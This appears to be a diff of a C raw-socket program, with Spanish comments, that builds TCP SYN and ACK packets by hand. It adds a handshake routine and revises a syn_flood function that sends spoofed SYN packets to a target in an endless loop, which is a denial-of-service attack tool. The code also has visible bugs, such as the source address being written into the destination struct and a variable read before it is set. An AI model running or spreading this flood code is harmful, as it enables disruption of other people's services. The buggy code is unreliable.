@@ -11,6 +11,7 @@
 #include <unistd.h>
 #include "./includes/checksum.h"
 #include "./includes/tcp.h"
+#include "./includes/udp.h"
 
 #define PACKET_LEN 4096
 #define OPT_SIZE 20
@@ -22,7 +23,6 @@ int host_addr(struct sockaddr_in *h_addr, char *addr, int port){
 	host.sin_port = htons(port);
 	if (inet_pton(AF_INET, addr, &host.sin_addr) != 1)
 	{
-		printf("destination IP configuration failed\n");
 		return 1;
 	}
 	*h_addr = host;
@@ -33,7 +33,7 @@ int host_addr(struct sockaddr_in *h_addr, char *addr, int port){
 void tcp_syn_packet(struct sockaddr_in* src, struct sockaddr_in* dst, char** packet_ret, int* packet_len){
 
     char *packet = calloc(PACKET_LEN, sizeof(char));
-	char *pseudogram;// *data
+	char *pseudogram;
 	
 	//IP header
 	struct iphdr *iph = (struct iphdr *) packet;
@@ -94,14 +94,74 @@ void tcp_syn_packet(struct sockaddr_in* src, struct sockaddr_in* dst, char** pac
 	free(pseudogram);
 }
 
+void tcp(int sockfd, char* destino, char* addr_src, int puerto){
+	// direccion IP de destino
+	struct sockaddr_in daddr;
+	if(host_addr(&daddr, destino, puerto) == 1){
+		perror("Error al crear la configuracion IP");
+		exit(1);
+	}
+
+	// direccion IP de origen
+	struct sockaddr_in saddr;
+	if(host_addr(&saddr, addr_src, rand() % 65535) == 1){
+		perror("Error al crear la configuracion IP");
+		exit(1);
+	}
+
+	// Creamos el paquete SYN TCP que vamos a enviar, inicio del TCP handshake
+	char* packet;
+	int packet_len;
+	tcp_syn_packet(&saddr, &daddr, &packet, &packet_len);
+
+	// Enviamos el paquete SYN al destino
+	if (sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
+	{
+		perror("No se ha podido enviar el paquete SYN");
+		exit(1);
+	} else {
+		// Esperamos a recibir la respuesta, SYN-ACK, del destino al paquete SYN que se ha enviado
+		char recvbuf[PACKET_LEN];
+		int received = receive_from(sockfd, recvbuf, sizeof(recvbuf), &saddr);
+		if (received <= 0)
+		{
+			printf("receive_from() failed\n");
+		}
+		else
+		{
+			printf("SYN-ACK recibido\n");
+		}
+
+		// Leemos la sequencia del paquete SYN-ACK recibido para enviar un paquete ACK
+		// con dicho numero de vuelta indicando que se ha recibido dicho paquete
+		uint32_t seq_num, ack_num;
+		read_seq_and_ack(recvbuf, &seq_num, &ack_num);
+		int new_seq_num = seq_num + 1;
+
+		// Creamos y enviamos paquete ACK con el numero de sequencia previo como numero ack
+		int sent;
+		create_ack_packet(&saddr, &daddr, ack_num, new_seq_num, &packet, &packet_len);
+		if ((sent = sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr))) == -1)
+		{
+			perror("Error al enviar el paquete ACK");
+            exit(1);
+		}
+		else
+		{
+			printf("El paquete ACK se ha enviado a %s. Tamaño: %d\n", destino, packet_len);
+		}
+		close(sockfd);
+	}
+}
+
 // Funcion que espera a recibir un paquete por el socket dado
-int receive_from(int sock, char* buffer, size_t buffer_length, struct sockaddr_in *dst)
+int receive_from(int sockfd, char* buffer, size_t buffer_length, struct sockaddr_in *dst)
 {
 	unsigned short dst_port;
 	int received;
 	while (dst_port != dst->sin_port)
 	{
-		received = recv(sock, buffer, buffer_length, 0);
+		received = recv(sockfd, buffer, buffer_length, 0);
 		if (received < 0)
 			break;
 		memcpy(&dst_port, buffer + 22, sizeof(dst_port));
@@ -135,6 +195,8 @@ void create_ack_packet(struct sockaddr_in* src, struct sockaddr_in* dst, int32_t
 	iph->saddr = src->sin_addr.s_addr;
 	iph->daddr = dst->sin_addr.s_addr;
 
+	iph->check = csum((unsigned short*)datagram, iph->tot_len);
+
 	// Configuracion header TCP
 	tcph->source = src->sin_port;
 	tcph->dest = dst->sin_port;
@@ -164,7 +226,6 @@ void create_ack_packet(struct sockaddr_in* src, struct sockaddr_in* dst, int32_t
 	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + OPT_SIZE);
 
 	tcph->check = csum((unsigned short*)pseudogram, psize);
-	iph->check = csum((unsigned short*)datagram, iph->tot_len);
 
 	*out_packet = datagram;
 	*out_packet_len = iph->tot_len;
@@ -174,13 +235,13 @@ void create_ack_packet(struct sockaddr_in* src, struct sockaddr_in* dst, int32_t
 // Funcion que lee el numero de sequencia y ack del paquete dado
 void read_seq_and_ack(const char* packet, uint32_t* seq, uint32_t* ack)
 {
-	// read sequence number
+	// leer sequence number
 	uint32_t seq_num;
 	memcpy(&seq_num, packet + 24, 4);
-	// read acknowledgement number
+	// leer acknowledgement number
 	uint32_t ack_num;
 	memcpy(&ack_num, packet + 28, 4);
-	// convert network to host byte order
+	// le to be
 	*seq = ntohl(seq_num);
 	*ack = ntohl(ack_num);
 	printf("sequence number: %lu\n", (unsigned long)*seq);
@@ -188,23 +249,30 @@ void read_seq_and_ack(const char* packet, uint32_t* seq, uint32_t* ack)
 }
 
 // Funcion que genera paquetes SYN tcp con direccion de origen, destino y puerto dados en bucle
-int syn_flood(int sockfd, char *address_dst, char *address_src, int port){
+void syn_flood(int sockfd, char *address_dst, char *address_src ,int port){
 	while(1){
 		// direccion IP de destino
 		struct sockaddr_in daddr;
 		if(host_addr(&daddr, address_dst, port) == 1){
-			return 1;
+			perror("Error al crear la configuracion IP");
+			exit(1);
 		}
-
 		// direccion IP de origen
 		struct sockaddr_in saddr;
 		if(host_addr(&daddr, address_src, rand() % 65536) == 1){
-			return 1;
+			perror("Error al crear la configuracion IP");
+			exit(1);
 		}
 
 		char* packet;
 		int packet_len;
 		tcp_syn_packet(&saddr, &daddr, &packet, &packet_len);
-		sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr));
+		if(sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
+		{
+			perror("Error al enviar el paquete SYN");
+            exit(1);
+        } else {
+			printf ("Paquete SYN enviado a %s enviado. Tamaño : %d \n", address_dst, packet_len);
+		}
     }
 }
